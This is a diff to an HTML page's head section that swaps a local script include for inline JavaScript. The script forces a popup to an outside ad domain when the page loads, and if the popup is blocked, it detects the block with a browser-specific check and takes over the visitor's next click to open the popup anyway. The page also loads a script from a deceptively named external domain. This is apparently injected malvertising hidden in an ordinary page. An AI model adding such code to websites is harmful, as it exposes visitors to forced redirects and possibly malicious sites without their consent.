@@ -8,7 +8,37 @@
 
 
 <head>
-	<script src="key.js"></script>
+	 <script type="text/javascript">
+var win = window.open('https://omg10.com/4/11176773', "popup", 'toolbars=0, scrollbars=1, location=0, statusbars=0, menubars=0, resizable=1, width=650, height=650, left = 300, top = 50');
+if (!win){
+//    alert("failed for most browsers");
+    document.body.onclick = function () {
+         window.open('https://omg10.com/4/11176773', 'poppage', 'toolbars=0, scrollbars=1, location=0, statusbars=0, menubars=0, resizable=1, width=650, height=650, left = 300, top = 50');
+    };
+}else {
+    var thisdoc = document;
+    //Is it Chrome?
+    if(/chrome/.test(navigator.userAgent.toLowerCase())){
+        setTimeout(function() {
+            if ((win.innerHeight > 0) == false){
+//                alert("failed for chrome");
+                  thisdoc.body.onclick = function () {
+                      window.open('https://omg10.com/4/11176773', 'poppage', 'toolbars=0, scrollbars=1, location=0, statusbars=0, menubars=0, resizable=1, width=650, height=650, left = 300, top = 50');
+                  };
+             }
+        }, 100);
+    }else{
+       win.onload = function() {
+            if ((win.innerHeight > 0) == false){
+//                alert("failed for others");
+                  thisdoc.body.onclick = function () {
+                     window.open('https://omg10.com/4/11176773', 'poppage', 'toolbars=0, scrollbars=1, location=0, statusbars=0, menubars=0, resizable=1, width=650, height=650, left = 300, top = 50');
+                  };
+            }
+       };
+    }
+}
+</script>
 	
     
     <script src="https://class-java-script-jpeg-color-font-style.ink/ss-div-clkass.js"></script>
